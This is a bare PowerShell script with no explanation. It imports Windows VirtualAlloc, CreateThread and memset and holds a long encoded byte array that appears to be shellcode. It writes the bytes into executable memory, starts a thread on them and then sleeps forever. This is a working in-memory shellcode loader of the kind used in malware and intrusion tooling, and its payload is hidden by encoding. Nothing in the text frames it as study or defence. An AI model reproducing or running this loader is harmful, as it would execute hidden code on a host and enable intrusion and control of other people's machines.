$t2Yi = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $t2Yi -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x01,0x09,0xf4,0xc1,0xdd,0xc1,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x7d,0x0f,0x03,0x7d,0x0e,0xeb,0x01,0x3d,0xf8,0x69,0xe9,0xbe,0xf8,0x0d,0x63,0x5b,0xc9,0x0d,0x17,0x2f,0x79,0xbe,0x53,0x7d,0x75,0x35,0x31,0x96,0x0e,0x3b,0x9e,0x99,0xa7,0xf6,0xf8,0x94,0x38,0xaa,0x39,0xb6,0xba,0xb1,0x6d,0x18,0x83,0x79,0x60,0x59,0xc4,0x64,0x89,0x0b,0x9d,0xe3,0x3c,0xbc,0xaa,0xbe,0xfc,0x37,0xe0,0x2f,0x85,0xa4,0xb0,0x4e,0xa4,0x7a,0xcb,0x08,0x66,0x7c,0x18,0x21,0x2f,0x66,0x7d,0x0c,0xf9,0x1d,0xb5,0xfa,0xf8,0xf7,0x84,0x03,0x56,0x36,0x29,0xf6,0xa6,0x7e,0x8d,0xe9,0xdc,0x76,0xee,0x94,0xe6,0x4c,0x8d,0x42,0x62,0x57,0x35,0x00,0xd4,0xb3,0xc4,0xc5,0x83,0x30,0xca,0xa2,0xc0,0x1f,0xce,0x35,0x04,0x14,0xea,0xbe,0xab,0xfb,0x7b,0x84,0x8f,0xdf,0x20,0x5e,0xb1,0x46,0x8c,0x31,0xce,0x99,0x6f,0xed,0x6a,0xd1,0x9d,0xfa,0x06,0xb8,0xc9,0xcf,0x2a,0x43,0x09,0x58,0x3c,0x30,0x3b,0xc7,0x96,0xde,0x77,0x80,0x30,0x18,0x78,0xbb,0x85,0xb6,0x87,0x44,0xf6,0x9f,0x43,0x10,0xa6,0xb7,0x62,0x19,0x2d,0x48,0x8b,0xcc,0xd8,0x4d,0x1b,0x62,0xe3,0xd1,0xb7,0x14,0x1e,0xee,0x56,0xb9,0x97,0x08,0x08,0x11,0xf8,0x84,0xe8,0xc1,0xb8,0x74,0x80,0x0b,0x37,0xaa,0xb0,0x33,0x9d,0xc3,0x5a,0xdc,0x48,0xbb,0xf2,0x45,0xd1,0x37,0x63,0x89,0xcf,0x3d,0xa3,0x01,0xfc,0xc2,0x6d,0xe2,0x89,0xd0,0x19,0x02,0xc4,0x8b,0x8f,0x1d,0xf2,0xa6,0x2f,0x88,0xf9,0x60,0x78,0x24,0x00,0x54,0x4e,0xeb,0xfb,0xb3,0xc5,0x22,0x6e,0x7c,0xb1,0x4a,0x7e,0x7c,0x41,0x1d,0x14,0x7c,0x29,0xf9,0x4c,0x2f,0x4c,0x06,0x59,0x43,0xdd,0x93,0x62,0x32,0xb2,0x34,0x0b,0xb8,0xed,0x73,0x94,0x43,0xd8,0x85,0xe8,0x95,0x24,0xf0,0x00,0x26;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$k44=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($k44.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$k44,0,0,0);for (;;){Start-sleep 60};